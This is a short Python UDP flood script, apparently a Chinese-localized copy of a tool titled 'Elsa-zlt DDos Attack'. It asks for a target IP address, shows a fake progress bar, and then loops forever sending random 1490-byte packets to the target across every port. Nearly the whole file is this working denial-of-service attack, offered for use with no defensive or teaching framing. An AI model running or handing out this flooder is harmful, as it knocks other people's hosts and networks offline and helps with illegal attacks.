import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Elsa-zlt DDos Attack")
print()
print("汉化作者   : lcq")
print("我们的论坛  : http://wangjiahui.tk")
print("论坛地址     : http://wangjiahui.tk")
print()
ip = input("IP地址: ")
port = input("攻击次数       : ")
port = int(port)

os.system("clear")
os.system("figlet Elsa-zlt DDos Attack")
print("[                    ] 0%注入中~ ")
time.sleep(5)
print("[=====               ] 25%开始啦~")
time.sleep(5)
print("[==========          ] 50%马上完成~")
time.sleep(5)
print("[===============     ] 75%还在注入~")
time.sleep(5)
print("[====================] 100%开始喽~")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1

